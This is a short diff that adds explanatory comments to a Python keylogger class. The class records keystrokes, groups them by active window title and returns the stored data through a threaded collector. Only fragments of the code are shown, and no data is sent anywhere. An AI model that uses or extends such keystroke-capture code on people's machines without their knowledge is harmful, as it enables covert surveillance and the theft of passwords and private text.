@@ -3,9 +3,10 @@ from i_key_logger_service import IKeloggerService
 import pygetwindow as gw
 import threading
 
+# The Service
 class KeyLoggerService(IKeloggerService):
 
-    storage = {}
+    storage = {} # Store the data
 
     def on_press(self, key):
         try:
@@ -17,6 +18,7 @@ class KeyLoggerService(IKeloggerService):
             KeyLoggerService.storage[current_screen] = []
         KeyLoggerService.storage[current_screen].append(formated)
 
+    # Run the service
     @property
     def start(self):
         def collect():
@@ -27,10 +29,12 @@ class KeyLoggerService(IKeloggerService):
         collector = threading.Thread(target=collect)
         collector.start()
 
+    # Stop the service
     @property
     def stop(self):
         pass
 
+    # Returns the data
     @property
     def get(self):
         data = KeyLoggerService.storage
